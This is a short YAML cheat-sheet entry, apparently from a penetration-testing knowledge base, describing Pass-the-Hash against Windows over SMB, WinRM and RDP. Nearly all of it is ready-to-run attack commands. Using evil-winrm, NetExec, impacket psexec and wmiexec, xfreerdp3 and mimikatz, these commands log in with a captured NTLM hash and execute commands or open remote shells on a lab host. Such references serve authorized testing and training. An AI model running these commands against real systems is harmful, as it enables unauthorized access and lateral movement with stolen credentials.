---
description: |
  Pass-the-Hash (PtH) — authenticate using NTLM hashes instead of plaintext passwords across SMB, WinRM, and RDP.
commands:
  - have: Hash
    cmd: |
      evil-winrm -i 10.10.10.27 -u sec_user -H NTHASH
      nxc smb 10.10.10.27 -u sec_user -H NTHASH -x "whoami"
      impacket-psexec senshu.sh/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH
      impacket-wmiexec senshu.sh/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH
      xfreerdp3 /v:10.10.10.27 /u:sec_user /pth:NTHASH /d:senshu.sh
      mimikatz.exe "sekurlsa::pth /user:sec_user /domain:senshu.sh /ntlm:NTHASH"
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
  - WinRM
  - RDP
techniques:
  - Pass-the-Hash
references:
  - https://github.com/fortra/impacket
  - https://github.com/Hackplayers/evil-winrm
  - https://www.netexec.wiki/
---
